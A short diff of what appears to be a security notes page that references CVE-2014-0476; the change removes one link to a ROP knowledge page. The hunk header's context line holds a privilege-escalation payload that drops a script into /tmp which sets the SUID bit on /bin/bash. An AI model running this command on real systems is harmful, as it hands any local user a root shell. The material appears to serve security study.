@@ -100,4 +100,3 @@ printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /tmp/update; chmod +x /tmp/update
 
 - [CVE-2014-0476](https://nvd.nist.gov/vuln/detail/CVE-2014-0476)
 - [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
-- [rop-stack](../../../knowledge/pwn/rop-stack.md)
